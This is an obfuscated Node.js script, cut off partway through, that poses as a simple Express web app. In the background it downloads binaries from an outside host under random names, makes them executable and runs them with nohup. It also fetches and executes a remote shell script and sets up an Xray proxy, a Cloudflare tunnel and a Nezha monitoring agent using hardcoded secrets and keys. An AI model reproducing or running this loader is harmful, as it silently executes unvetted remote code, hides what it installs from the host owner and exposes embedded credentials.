const _0x4d35a3=_0x3018;(function(_0x656479,_0x523d1b){const _0x25bdf2=_0x3018,_0x4dae4f=_0x656479();while(!![]){try{const _0x594a0a=-parseInt(_0x25bdf2(0x1ac))/0x1*(parseInt(_0x25bdf2(0x1fa))/0x2)+-parseInt(_0x25bdf2(0x1de))/0x3+parseInt(_0x25bdf2(0x189))/0x4*(parseInt(_0x25bdf2(0x217))/0x5)+parseInt(_0x25bdf2(0x1a7))/0x6+parseInt(_0x25bdf2(0x1c6))/0x7+-parseInt(_0x25bdf2(0x1f7))/0x8+parseInt(_0x25bdf2(0x1bd))/0x9*(parseInt(_0x25bdf2(0x1fd))/0xa);if(_0x594a0a===_0x523d1b)break;else _0x4dae4f['push'](_0x4dae4f['shift']());}catch(_0x1b8101){_0x4dae4f['push'](_0x4dae4f['shift']());}}}(_0x660f,0xc6a2b));const _0x1043f6=(function(){let _0x54e4f2=!![];return function(_0x12e1d1,_0x1f953f){const _0x4940f5=_0x54e4f2?function(){const _0x4e4e32=_0x3018;if(_0x1f953f){const _0x5751f8=_0x1f953f[_0x4e4e32(0x23b)](_0x12e1d1,arguments);return _0x1f953f=null,_0x5751f8;}}:function(){};return _0x54e4f2=![],_0x4940f5;};}()),_0x47fdd6=_0x1043f6(this,function(){const _0xf5aad5=_0x3018;return _0x47fdd6[_0xf5aad5(0x17f)]()[_0xf5aad5(0x1d7)](_0xf5aad5(0x187)+'+$')['toString']()['constructo'+'r'](_0x47fdd6)[_0xf5aad5(0x1d7)]('(((.+)+)+)'+'+$');});_0x47fdd6();const express=require(_0x4d35a3(0x17c)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x4d35a3(0x161)),exec=promisify(require('child_proc'+_0x4d35a3(0x212))['exec']),{execSync}=require('child_proc'+'ess'),http=require('http'),httpProxy=require(_0x4d35a3(0x18d)),UPLOAD_URL=process[_0x4d35a3(0x145)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x4d35a3(0x1a6)+'L']||'',AUTO_ACCESS=process['env']['AUTO_ACCES'+'S']||![],FILE_PATH=process['env'][_0x4d35a3(0x1b2)]||_0x4d35a3(0x1d8),SUB_PATH=process['env']['SUB_PATH']||_0x4d35a3(0x1cb),PORT=process['env']['SERVER_POR'+'T']||process[_0x4d35a3(0x145)]['PORT']||0xbb8,EXTERNAL_PORT=process['env']['EXTERNAL_P'+'ORT']||0x1eb4,UUID=process['env'][_0x4d35a3(0x1e1)]||_0x4d35a3(0x232)+_0x4d35a3(0x1e7)+'f2b-87915b'+'d2093a',NEZHA_SERVER=process[_0x4d35a3(0x145)]['NEZHA_SERV'+'ER']||'',NEZHA_PORT=process[_0x4d35a3(0x145)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x4d35a3(0x145)][_0x4d35a3(0x1c5)+'N']||'cftime.lln'+_0x4d35a3(0x1c0),ARGO_AUTH=process[_0x4d35a3(0x145)]['ARGO_AUTH']||'{\x22AccountT'+_0x4d35a3(0x143)+_0x4d35a3(0x1b0)+_0x4d35a3(0x141)+'afa598b\x22,\x22'+_0x4d35a3(0x235)+_0x4d35a3(0x17b)+_0x4d35a3(0x1bf)+_0x4d35a3(0x22a)+_0x4d35a3(0x228)+_0x4d35a3(0x1a3)+',\x22TunnelID'+'\x22:\x2266e2951'+'d-0287-41d'+'7-b6b0-c5d'+_0x4d35a3(0x1f6)+',\x22Endpoint'+_0x4d35a3(0x1eb),CFIP=process[_0x4d35a3(0x145)][_0x4d35a3(0x203)]||'cdns.doon.'+_0x4d35a3(0x1ee),CFPORT=process[_0x4d35a3(0x145)][_0x4d35a3(0x1a1)]||0x1bb,NAME=process['env'][_0x4d35a3(0x173)]||'',MONITOR_KEY=process[_0x4d35a3(0x145)][_0x4d35a3(0x1b7)+'Y']||_0x4d35a3(0x1c3)+_0x4d35a3(0x1e9)+_0x4d35a3(0x195)+_0x4d35a3(0x174)+'0efee3e45d'+_0x4d35a3(0x1d4)+_0x4d35a3(0x185),MONITOR_SERVER=process[_0x4d35a3(0x145)]['MONITOR_SE'+'RVER']||'d3bkmf',MONITOR_URL=process['env'][_0x4d35a3(0x17a)+'L']||'https://up'+_0x4d35a3(0x1b5)+'gxzg.indev'+_0x4d35a3(0x160);console['log']('使用的UUID:\x20'+UUID);MONITOR_KEY&&MONITOR_SERVER&&MONITOR_URL&&(console[_0x4d35a3(0x1cf)](_0x4d35a3(0x1f4)+'动运行'),console['log']('监控密钥:\x20'+MONITOR_KEY[_0x4d35a3(0x213)](0x0,0x8)+'...'),console[_0x4d35a3(0x1cf)]('监控服务器:\x20'+MONITOR_SERVER),console['log']('监控URL:\x20'+MONITOR_URL));!fs['existsSync'](FILE_PATH)?(fs[_0x4d35a3(0x176)](FILE_PATH),console['log'](FILE_PATH+_0x4d35a3(0x223))):console['log'](FILE_PATH+'\x20已存在');function generateRandomName(){const _0x22142c=_0x4d35a3,_0x52be87=_0x22142c(0x165)+_0x22142c(0x1d0)+_0x22142c(0x14a);let _0x3822f7='';for(let _0x54b0af=0x0;_0x54b0af<0x6;_0x54b0af++){_0x3822f7+=_0x52be87['charAt'](Math[_0x22142c(0x23a)](Math['random']()*_0x52be87['length']));}return _0x3822f7;}function _0x660f(){const _0xf55e5e=['express','tcp','url','toString','rocs\x20>/dev','m64.ssss.n','https://am','status','oken\x20','16f9','/vmess-arg','(((.+)+)+)','tor/main/c','232000oGplHi','win32','p2\x20--logfi','隧道YAML配置生成','http-proxy','8443','firefox','none','te\x20--repor','/vless','response','e:\x20false\x0au','e58d6d96cd','hubusercon','ll\x202>&1\x20&','n\x20--skip-p','\x20http2\x0a\x0ain','pipe','?security=','arm','applicatio','stringify','join','\x20run','CFPORT','fileName','Qkp6wH9k=\x22','length','HTTP流量\x20->\x20','PROJECT_UR','8058084LTVHPh','e\x0atemperat','freedom','t-delay\x204\x20','platform','148578qNwkwq','127.0.0.1','unlink','mmand_exec','ef8a13b1d5','host=','FILE_PATH','ain，重新运行bo','forEach','time-vps.b','alhost:','MONITOR_KE','读取boot.log','/null\x202>&1','/api/add-n','listen','untry_code','538218uUhbka','-monitor/m','h6/qIvsF1C','g.de5.net','chmod','未处理的starts','a88b11cbdd','ain','ARGO_DOMAI','6068678AMfSJL','unlinkSync','Unknown','执行命令错误:\x20','n/json','sub','close','le\x20','adidalax/c','log','klmnopqrst','UseIP','push','alhost:300','119c2f2102','2083','/vless-arg','search','./tmp','1.1.1.1','Xray流量\x20->\x20','下载文件时出错:','自动访问任务添加成功','startsWith','4705152VtgNKD','ue\x0aip_repo','\x20>/dev/nul','UUID','statSync','TunnelID','/api/add-s','nohup\x20','错误:','a20-6d50-7','http','705529210c','writeFileS','\x22:\x22\x22}','监控命令执行成功','https://ar','eu.org','IPIfNonMat','订阅上传成功','应用正在运行','wget\x20https','http://loc','监控脚本已配置，将自','\x20-c\x20','6cbff04da\x22','4771944lgLFgL','gress:\x0a\x20\x20-','Content-Ty','8matOuK','下载或运行监控脚本失','ync','160AScwkv','e:\x20true\x0adi','split','base64','count:\x20tru','部端口:\x20','CFIP','d64.ssss.n','utf-8','quic','isFile','\x0a\x20\x20\x20\x20origi','/trojan-ar','existsSync','未找到ArgoDom','\x22\x20>/dev/nu','代理服务器运行在端口','w.githubus','oken连接隧道','message','--config\x20','ess','substring','taskkill\x20/','success','\x20下载监控脚本','35TjAXIa','all','https://ip','data','3Fed%3D256','error','/dev/null','filter','感谢使用此脚本，享受','找不到适合当前架构的','yc.mn/agen','下载\x20','\x20已创建','org','&fp=firefo','localhost:','ull\x202>&1','56HnMfbTfH','ls-file:\x20','B1nVq3Ud2S','跳过监控脚本启动','HTTP服务运行在内','直接运行监控命令失败','/trojan','kip_procs_','npm运行错误:\x20','cf-vps-mon','3f33f14e-6','\x20>\x20nul\x202>&','index.html','TunnelSecr','config.yam','3001','\x20-s\x20','_to_upgrad','floor','apply','443','direct','o?ed=2560','--skip-con','d1a88ae015','ARGO_AUTH\x20','ag\x22:\x225df51','catch','env','vmess','ull\x202>&1\x20&','com/kadida','basename','uvwxyz','yc.mn/v1','2096','--tls','includes','get','yc.mn/bot','readFileSy','隧道运行成功','sion\x20auto\x20','\x0acredentia','rt_period:','pgrep\x20-f\x20\x22','\x20false\x0adis','unshift','dge-ip-ver','send','-auto-upda','2053','clear','ercontent.','\x20运行中','s.in','util','\x0ause_gitee','from','arch','abcdefghij','re_tls:\x20tr','...','blackhole','parse','yc.mn/web','fileUrl','\x20-u\x20','tunnel:\x20','xtls-rprx-','urity=tls&','pdate\x20--pr','countryCod','2087','NAME','48033195da','vless','mkdirSync','运行监控脚本失败:\x20','x&type=ws&','NEZHA变量为空，','MONITOR_UR','et\x22:\x22N1EzD'];_0x660f=function(){return _0xf55e5e;};return _0x660f();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName(),monitorName=_0x4d35a3(0x231)+'itor.sh';let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),monitorPath=path['join'](FILE_PATH,monitorName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x4d35a3(0x19f)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.jso'+'n'),nezhaConfigPath=path[_0x4d35a3(0x19f)](FILE_PATH,_0x4d35a3(0x236)+'l'),tunnelJsonPath=path[_0x4d35a3(0x19f)](FILE_PATH,'tunnel.jso'+'n'),tunnelYamlPath=path['join'](FILE_PATH,'tunnel.yml');const proxy=httpProxy['createProx'+'yServer'](),proxyServer=http['createServ'+'er']((_0x3135f8,_0x1cabbf)=>{const _0x1e556c=_0x4d35a3,_0x47311d=_0x3135f8[_0x1e556c(0x17e)];_0x47311d['startsWith']('/vless-arg'+'o')||_0x47311d[_0x1e556c(0x1dd)]('/vmess-arg'+'o')||_0x47311d[_0x1e556c(0x1dd)](_0x1e556c(0x209)+'go')||_0x47311d===_0x1e556c(0x192)||_0x47311d==='/vmess'||_0x47311d===_0x1e556c(0x22e)?proxy['web'](_0x3135f8,_0x1cabbf,{'target':_0x1e556c(0x1f3)+_0x1e556c(0x1d3)+'1'}):proxy['web'](_0x3135f8,_0x1cabbf,{'target':_0x1e556c(0x1f3)+_0x1e556c(0x1b6)+PORT});});proxyServer['on']('upgrade',(_0x508bce,_0x2d90be,_0x63ce9d)=>{const _0x5c6562=_0x4d35a3,_0x4a53a3=_0x508bce[_0x5c6562(0x17e)];_0x4a53a3['startsWith']('/vless-arg'+'o')||_0x4a53a3['startsWith']('/vmess-arg'+'o')||_0x4a53a3['startsWith'](_0x5c6562(0x209)+'go')?proxy['ws'](_0x508bce,_0x2d90be,_0x63ce9d,{'target':_0x5c6562(0x1f3)+_0x5c6562(0x1d3)+'1'}):proxy['ws'](_0x508bce,_0x2d90be,_0x63ce9d,{'target':'http://loc'+'alhost:'+PORT});}),proxyServer[_0x4d35a3(0x1bb)](EXTERNAL_PORT,()=>{const _0x15f385=_0x4d35a3;console['log'](_0x15f385(0x20d)+':\x20'+EXTERNAL_PORT),console['log'](_0x15f385(0x1a5)+_0x15f385(0x226)+PORT),console[_0x15f385(0x1cf)](_0x15f385(0x1da)+_0x15f385(0x226)+_0x15f385(0x237));}),app['get']('/',function(_0x4277ab,_0x312cb2){const _0x183fbc=_0x4d35a3,_0xbf862c=path[_0x183fbc(0x19f)](__dirname,_0x183fbc(0x234));fs[_0x183fbc(0x20a)](_0xbf862c)?_0x312cb2['sendFile'](_0xbf862c):_0x312cb2['send']('Hello\x20worl'+'d!');});function _0x3018(_0x529ecd,_0x21c09d){const _0x16f061=_0x660f();return _0x3018=function(_0x47fdd6,_0x1043f6){_0x47fdd6=_0x47fdd6-0x141;let _0x660f87=_0x16f061[_0x47fdd6];return _0x660f87;},_0x3018(_0x529ecd,_0x21c09d);}let subscriptionContent='';app['get']('/'+SUB_PATH,(_0x3a523a,_0x443b8c)=>{const _0x1916ea=_0x4d35a3;subscriptionContent?(_0x443b8c['set'](_0x1916ea(0x1f9)+'pe','text/plain'+';\x20charset='+'utf-8'),_0x443b8c['send'](Buffer[_0x1916ea(0x163)](subscriptionContent)['toString']('base64'))):_0x443b8c[_0x1916ea(0x183)](0x194)[_0x1916ea(0x15a)]('订阅尚未生成');});function deleteNodes(){const _0x3c1d8d=_0x4d35a3;try{if(!UPLOAD_URL)return;if(!fs[_0x3c1d8d(0x20a)](subPath))return;let _0x125d80;try{_0x125d80=fs['readFileSy'+'nc'](subPath,'utf-8');}catch{return null;}const _0x520501=Buffer[_0x3c1d8d(0x163)](_0x125d80,_0x3c1d8d(0x200))['toString']('utf-8'),_0x409b71=_0x520501['split']('\x0a')['filter'](_0x2b236b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2b236b));if(_0x409b71['length']===0x0)return;return axios['post'](UPLOAD_URL+('/api/delet'+'e-nodes'),JSON['stringify']({'nodes':_0x409b71}),{'headers':{'Content-Type':_0x3c1d8d(0x19d)+'n/json'}})[_0x3c1d8d(0x144)](_0x5d1ad1=>{return null;}),null;}catch(_0x1c7a8b){return null;}}function cleanupOldFiles(){const _0x1fb7f2=_0x4d35a3;try{const _0x16c627=fs['readdirSyn'+'c'](FILE_PATH);_0x16c627[_0x1fb7f2(0x1b4)](_0x51dfdc=>{const _0x8611c2=_0x1fb7f2,_0x26e54e=path['join'](FILE_PATH,_0x51dfdc);try{const _0xd577d0=fs[_0x8611c2(0x1e2)](_0x26e54e);_0xd577d0[_0x8611c2(0x207)]()&&_0x51dfdc!==monitorName&&fs['unlinkSync'](_0x26e54e);}catch(_0x232742){}});}catch(_0x4ffd76){}}async function generateConfig(){const _0x59ff27=_0x4d35a3,_0x11c51a={'log':{'access':_0x59ff27(0x21d),'error':_0x59ff27(0x21d),'loglevel':'none'},'dns':{'servers':['https+loca'+'l://8.8.8.'+'8/dns-quer'+'y','https+loca'+'l://1.1.1.'+'1/dns-quer'+'y','8.8.8.8',_0x59ff27(0x1d9)],'queryStrategy':'UseIP','disableCache':![]},'inbounds':[{'port':0xbb9,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x59ff27(0x16e)+'vision'}],'decryption':_0x59ff27(0x190),'fallbacks':[{'dest':0xbba},{'path':_0x59ff27(0x1d6)+'o','dest':0xbbb},{'path':'/vmess-arg'+'o','dest':0xbbc},{'path':'/trojan-ar'+'go','dest':0xbbd}]},'streamSettings':{'network':_0x59ff27(0x17d)}},{'port':0xbba,'listen':_0x59ff27(0x1ad),'protocol':_0x59ff27(0x175),'settings':{'clients':[{'id':UUID}],'decryption':_0x59ff27(0x190)},'streamSettings':{'network':'tcp','security':_0x59ff27(0x190)}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x59ff27(0x206)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x59ff27(0x1ad),'protocol':_0x59ff27(0x146),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-arg'+'o'}},'sniffing':{'enabled':!![],'destOverride':[_0x59ff27(0x1e8),'tls','quic'],'metadataOnly':![]}},{'port':0xbbd,'listen':_0x59ff27(0x1ad),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x59ff27(0x190),'wsSettings':{'path':'/trojan-ar'+'go'}},'sniffing':{'enabled':!![],'destOverride':[_0x59ff27(0x1e8),'tls','quic'],'metadataOnly':![]}}],'outbounds':[{'protocol':_0x59ff27(0x1a9),'tag':_0x59ff27(0x23d),'settings':{'domainStrategy':_0x59ff27(0x1d1)}},{'protocol':_0x59ff27(0x168),'tag':'block'}],'routing':{'domainStrategy':_0x59ff27(0x1ef)+'ch','rules':[]}};fs['writeFileS'+_0x59ff27(0x1fc)](path['join'](FILE_PATH,'config.jso'+'n'),JSON[_0x59ff27(0x19e)](_0x11c51a,null,0x2));}function getSystemArchitecture(){const _0x4583af=_0x4d35a3,_0x50c4bc=os[_0x4583af(0x164)]();return _0x50c4bc===_0x4583af(0x19c)||_0x50c4bc==='arm64'||_0x50c4bc==='aarch64'?'arm':'amd';}function downloadFilePromise(_0x2f386b,_0x345b2e){return new Promise((_0x5bdc28,_0x23ecad)=>{const _0x2a17b0=_0x2f386b;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x362d83=fs['createWrit'+'eStream'](_0x2a17b0);axios({'method':'get','url':_0x345b2e,'responseType':'stream'})['then'](_0x1d6186=>{const _0x1a6db4=_0x3018;_0x1d6186[_0x1a6db4(0x21a)][_0x1a6db4(0x19a)](_0x362d83),_0x362d83['on']('finish',()=>{const _0x4f07b3=_0x1a6db4;_0x362d83[_0x4f07b3(0x1cc)](),console[_0x4f07b3(0x1cf)]('下载\x20'+path[_0x4f07b3(0x149)](_0x2a17b0)+'\x20成功'),_0x5bdc28(_0x2a17b0);}),_0x362d83['on'](_0x1a6db4(0x21c),_0x6492f4=>{const _0x2de9b1=_0x1a6db4;fs[_0x2de9b1(0x1ae)](_0x2a17b0,()=>{});const _0x3fcb99=_0x2de9b1(0x222)+path['basename'](_0x2a17b0)+'\x20失败:\x20'+_0x6492f4['message'];console[_0x2de9b1(0x21c)](_0x3fcb99),_0x23ecad(_0x3fcb99);});})['catch'](_0x1ba48e=>{const _0xf72f90=_0x3018,_0x7555ac='下载\x20'+path['basename'](_0x2a17b0)+'\x20失败:\x20'+_0x1ba48e[_0xf72f90(0x210)];console[_0xf72f90(0x21c)](_0x7555ac),_0x23ecad(_0x7555ac);});});}function downloadFile(_0x468abb,_0x268faa,_0x44805b){const _0x1fdacb=_0x4d35a3,_0x10361e=_0x468abb;!fs[_0x1fdacb(0x20a)](FILE_PATH)&&fs[_0x1fdacb(0x176)](FILE_PATH,{'recursive':!![]});const _0x4388ff=fs['createWrit'+'eStream'](_0x10361e);axios({'method':_0x1fdacb(0x14f),'url':_0x268faa,'responseType':'stream'})['then'](_0x41342c=>{const _0x480e53=_0x1fdacb;_0x41342c[_0x480e53(0x21a)]['pipe'](_0x4388ff),_0x4388ff['on']('finish',()=>{const _0x62403d=_0x480e53;_0x4388ff['close'](),console['log']('下载\x20'+path[_0x62403d(0x149)](_0x10361e)+'\x20成功'),_0x44805b(null,_0x10361e);}),_0x4388ff['on']('error',_0x352d4f=>{fs['unlink'](_0x10361e,()=>{});const _0x225e5d='下载\x20'+path['basename'](_0x10361e)+'\x20失败:\x20'+_0x352d4f['message'];console['error'](_0x225e5d),_0x44805b(_0x225e5d);});})['catch'](_0x234a2a=>{const _0x4d27f3='下载\x20'+path['basename'](_0x10361e)+'\x20失败:\x20'+_0x234a2a['message'];console['error'](_0x4d27f3),_0x44805b(_0x4d27f3);});}async function downloadAndRunMonitorScript(){const _0x338a12=_0x4d35a3;if(!MONITOR_KEY||!MONITOR_SERVER||!MONITOR_URL){console[_0x338a12(0x1cf)]('监控环境变量不完整，'+_0x338a12(0x22b));return;}await new Promise(_0x421983=>setTimeout(_0x421983,0x2710)),console[_0x338a12(0x1cf)]('开始下载并运行监控脚'+'本...');try{const _0x59a85d='https://ra'+_0x338a12(0x20e)+_0x338a12(0x15e)+_0x338a12(0x148)+'lax/cf-vps'+_0x338a12(0x1be)+'ain/cf-vps'+'-monitor.s'+'h';console['log']('从\x20'+_0x59a85d+_0x338a12(0x216)),await downloadFilePromise(monitorPath,_0x59a85d),fs['chmodSync'](monitorPath,0x1ed),console['log']('设置监控脚本执行权限'+'成功'),await runMonitorScript();}catch(_0xa2cd5f){console[_0x338a12(0x21c)](_0x338a12(0x1fb)+'败:\x20'+_0xa2cd5f['message']),await runDirectMonitor();}}async function runMonitorScript(){const _0x19df23=_0x4d35a3,_0x37f210=['-i','-k',MONITOR_KEY,'-s',MONITOR_SERVER,'-u',MONITOR_URL];console[_0x19df23(0x1cf)]('运行监控脚本:\x20'+monitorPath+'\x20'+_0x37f210['join']('\x20'));try{const _0x15acfd=_0x19df23(0x1e5)+monitorPath+'\x20'+_0x37f210['join']('\x20')+(_0x19df23(0x1e0)+'l\x202>&1\x20&');await exec(_0x15acfd),console[_0x19df23(0x1cf)]('监控脚本启动成功');}catch(_0x189ed3){console['error'](_0x19df23(0x177)+_0x189ed3['message']);throw _0x189ed3;}}async function runDirectMonitor(){const _0xf76b06=_0x4d35a3;console['log']('尝试直接运行监控命令'+_0xf76b06(0x167));const _0x3c9434=_0xf76b06(0x1f2)+'://raw.git'+_0xf76b06(0x196)+'tent.com/k'+_0xf76b06(0x1ce)+'f-vps-moni'+_0xf76b06(0x188)+'f-vps-moni'+'tor.sh\x20-O\x20'+monitorPath+('\x20&&\x20chmod\x20'+'+x\x20')+monitorPath+'\x20&&\x20'+monitorPath+'\x20-i\x20-k\x20'+MONITOR_KEY+_0xf76b06(0x238)+MONITOR_SERVER+_0xf76b06(0x16c)+MONITOR_URL;try{await exec(_0x3c9434),console[_0xf76b06(0x1cf)](_0xf76b06(0x1ec));}catch(_0x2f22e6){console['error'](_0xf76b06(0x22d)+':\x20'+_0x2f22e6['message']);}}async function downloadFilesAndRun(){const _0x3fa5e1=_0x4d35a3,_0x1ffac5=getSystemArchitecture(),_0x2f7a7d=getFilesForArchitecture(_0x1ffac5);if(_0x2f7a7d['length']===0x0){console[_0x3fa5e1(0x1cf)](_0x3fa5e1(0x220)+'文件');return;}const _0x424d3b=_0x2f7a7d['map'](_0x35f021=>{return new Promise((_0x19a916,_0x249333)=>{const _0x542015=_0x3018;downloadFile(_0x35f021[_0x542015(0x1a2)],_0x35f021[_0x542015(0x16b)],(_0x476948,_0x2312b6)=>{_0x476948?_0x249333(_0x476948):_0x19a916(_0x2312b6);});});});try{await Promise[_0x3fa5e1(0x218)](_0x424d3b);}catch(_0xc658f0){console['error'](_0x3fa5e1(0x1db),_0xc658f0);return;}function _0x317969(_0x24775e){const _0x20e2aa=0x1fd;_0x24775e['forEach'](_0xc14f97=>{const _0x2d0904=_0x3018;fs[_0x2d0904(0x20a)](_0xc14f97)&&fs[_0x2d0904(0x1c1)](_0xc14f97,_0x20e2aa,_0x442fd7=>{const _0x423aef=_0x2d0904;_0x442fd7?console[_0x423aef(0x21c)]('授权失败\x20'+_0xc14f97+':\x20'+_0x442fd7):console['log']('授权成功\x20'+_0xc14f97+':\x20'+_0x20e2aa[_0x423aef(0x17f)](0x8));});});}const _0x36da69=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x317969(_0x36da69);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x432409=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x3fa5e1(0x1ff)](':')['pop']():'',_0x188084=new Set([_0x3fa5e1(0x23c),_0x3fa5e1(0x18e),'2096','2087',_0x3fa5e1(0x1d5),_0x3fa5e1(0x15c)]),_0x420b82=_0x188084['has'](_0x432409)?'true':'false',_0x53c700='\x0aclient_se'+'cret:\x20'+NEZHA_KEY+('\x0adebug:\x20fa'+'lse\x0adisabl'+'e_auto_upd'+'ate:\x20true\x0a'+'disable_co'+_0x3fa5e1(0x1af)+'ute:\x20false'+'\x0adisable_f'+'orce_updat'+_0x3fa5e1(0x1fe)+'sable_nat:'+_0x3fa5e1(0x157)+'able_send_'+'query:\x20fal'+'se\x0agpu:\x20fa'+'lse\x0ainsecu'+_0x3fa5e1(0x166)+_0x3fa5e1(0x1df)+_0x3fa5e1(0x155)+'\x201800\x0arepo'+'rt_delay:\x20'+'4\x0aserver:\x20')+NEZHA_SERVER+('\x0askip_conn'+'ection_cou'+'nt:\x20true\x0as'+_0x3fa5e1(0x22f)+_0x3fa5e1(0x201)+_0x3fa5e1(0x1a8)+'ure:\x20false'+'\x0atls:\x20')+_0x420b82+(_0x3fa5e1(0x162)+_0x3fa5e1(0x239)+_0x3fa5e1(0x194)+'se_ipv6_co'+_0x3fa5e1(0x1bc)+':\x20false\x0auu'+'id:\x20')+UUID;fs[_0x3fa5e1(0x1ea)+_0x3fa5e1(0x1fc)](nezhaConfigPath,_0x53c700);const _0x546cb8=_0x3fa5e1(0x1e5)+phpPath+'\x20-c\x20\x22'+nezhaConfigPath+(_0x3fa5e1(0x20c)+_0x3fa5e1(0x197));try{await exec(_0x546cb8),console[_0x3fa5e1(0x1cf)](phpName+'\x20运行中'),await new Promise(_0x37beb4=>setTimeout(_0x37beb4,0x3e8));}catch(_0x298172){console['error']('php运行错误:\x20'+_0x298172);}}else{let _0x1010dd='';const _0x47b2a2=['443','8443',_0x3fa5e1(0x14c),_0x3fa5e1(0x172),'2083','2053'];_0x47b2a2[_0x3fa5e1(0x14e)](NEZHA_PORT)&&(_0x1010dd=_0x3fa5e1(0x14d));const _0x40d76e='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1010dd+('\x20--disable'+_0x3fa5e1(0x15b)+_0x3fa5e1(0x191)+_0x3fa5e1(0x1aa)+_0x3fa5e1(0x23f)+_0x3fa5e1(0x198)+_0x3fa5e1(0x180)+_0x3fa5e1(0x1b9)+'\x20&');try{await exec(_0x40d76e),console[_0x3fa5e1(0x1cf)](npmName+_0x3fa5e1(0x15f)),await new Promise(_0x247c11=>setTimeout(_0x247c11,0x3e8));}catch(_0x20daf5){console[_0x3fa5e1(0x21c)](_0x3fa5e1(0x230)+_0x20daf5);}}}else console[_0x3fa5e1(0x1cf)](_0x3fa5e1(0x179)+'跳过运行');const _0x4af057='nohup\x20'+webPath+_0x3fa5e1(0x1f5)+FILE_PATH+('/config.js'+'on\x20>/dev/n'+_0x3fa5e1(0x147));try{await exec(_0x4af057),console['log'](webName+'\x20运行中'),await new Promise(_0x12867b=>setTimeout(_0x12867b,0x3e8));}catch(_0x454b6e){console['error']('web运行错误:\x20'+_0x454b6e);}if(fs[_0x3fa5e1(0x20a)](botPath)){let _0x49c1a8;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x49c1a8='tunnel\x20--e'+'dge-ip-ver'+'sion\x20auto\x20'+'--no-autou'+_0x3fa5e1(0x170)+'otocol\x20htt'+'p2\x20run\x20--t'+_0x3fa5e1(0x184)+ARGO_AUTH;else ARGO_AUTH['includes']('TunnelSecr'+'et')?(!fs['existsSync'](tunnelYamlPath)&&(console[_0x3fa5e1(0x1cf)]('等待tunnel.y'+'ml配置...'),await new Promise(_0x37d09d=>setTimeout(_0x37d09d,0x3e8))),_0x49c1a8='tunnel\x20--e'+_0x3fa5e1(0x159)+'sion\x20auto\x20'+_0x3fa5e1(0x211)+tunnelYamlPath+_0x3fa5e1(0x1a0)):_0x49c1a8='tunnel\x20--e'+'dge-ip-ver'+'sion\x20auto\x20'+'--no-autou'+_0x3fa5e1(0x170)+'otocol\x20htt'+'p2\x20--logfi'+'le\x20'+bootLogPath+('\x20--logleve'+'l\x20info\x20--u'+'rl\x20http://'+'localhost:')+EXTERNAL_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x49c1a8+(_0x3fa5e1(0x1e0)+'l\x202>&1\x20&')),console[_0x3fa5e1(0x1cf)](botName+'\x20运行中'),console['log']('等待隧道启动...'),await new Promise(_0x5bf56e=>setTimeout(_0x5bf56e,0x1388));if(ARGO_AUTH[_0x3fa5e1(0x14e)](_0x3fa5e1(0x235)+'et'))try{process[_0x3fa5e1(0x1ab)]===_0x3fa5e1(0x18a)?await exec('tasklist\x20|'+'\x20findstr\x20'+botName+'\x20>\x20nul'):await exec(_0x3fa5e1(0x156)+'['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+('\x22\x20>\x20/dev/n'+'ull')),console[_0x3fa5e1(0x1cf)](_0x3fa5e1(0x152));}catch(_0x4e0c15){console[_0x3fa5e1(0x21c)]('隧道启动失败');}}catch(_0x20e92e){console[_0x3fa5e1(0x21c)]('执行命令错误:\x20'+_0x20e92e);}}await new Promise(_0x3ae2e7=>setTimeout(_0x3ae2e7,0x7d0));}function getFilesForArchitecture(_0x317d30){const _0x1d38c9=_0x4d35a3;let _0x17220c;_0x317d30==='arm'?_0x17220c=[{'fileName':webPath,'fileUrl':'https://ar'+'m64.ssss.n'+_0x1d38c9(0x16a)},{'fileName':botPath,'fileUrl':_0x1d38c9(0x1ed)+_0x1d38c9(0x181)+_0x1d38c9(0x150)}]:_0x17220c=[{'fileName':webPath,'fileUrl':_0x1d38c9(0x182)+'d64.ssss.n'+'yc.mn/web'},{'fileName':botPath,'fileUrl':'https://am'+_0x1d38c9(0x204)+'yc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x685df8=_0x317d30===_0x1d38c9(0x19c)?'https://ar'+'m64.ssss.n'+_0x1d38c9(0x221)+'t':_0x1d38c9(0x182)+'d64.ssss.n'+'yc.mn/agen'+'t';_0x17220c[_0x1d38c9(0x158)]({'fileName':npmPath,'fileUrl':_0x685df8});}else{const _0xbbd460=_0x317d30==='arm'?'https://ar'+'m64.ssss.n'+_0x1d38c9(0x14b):'https://am'+'d64.ssss.n'+'yc.mn/v1';_0x17220c['unshift']({'fileName':phpPath,'fileUrl':_0xbbd460});}}return _0x17220c;}function argoType(){const 